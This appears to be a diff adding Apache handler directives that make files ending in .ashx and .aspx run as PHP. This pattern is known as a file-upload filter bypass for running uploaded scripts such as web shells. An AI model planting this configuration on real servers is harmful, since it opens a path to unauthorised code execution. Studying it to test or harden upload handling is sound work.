@@ -1,0 +1,5 @@
+AddHandler application/x-httpd-php .ashx
+AddType application/x-httpd-php .ashx
+AddHandler application/x-httpd-php .aspx
+AddType application/x-httpd-php .aspx
+  
